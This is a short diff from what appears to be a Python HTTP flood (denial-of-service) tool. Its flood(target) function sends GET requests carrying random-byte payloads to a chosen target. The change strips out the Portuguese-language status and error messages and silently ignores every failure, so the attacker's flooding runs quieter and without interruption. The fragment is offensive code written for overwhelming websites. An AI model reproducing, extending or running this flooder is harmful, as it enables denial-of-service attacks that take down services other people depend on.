@@ -24,13 +24,5 @@ def flood(target):
     payload = str(random._urandom(random.randint(10, 150)))
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
-    except requests.exceptions.ConnectTimeout:
-        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
     except Exception as e:
-        print(
-            f"{Fore.MAGENTA}Erro ao enviar requests GET\n{Fore.MAGENTA}{e}{Fore.RESET}"
-        )
-    else:
-        print(
-            f"{Fore.GREEN}[{r.status_code}] {Fore.CYAN}Request enviando! Tamanho do Payload: {len(payload)}.{Fore.RESET}"
-        )
+        return
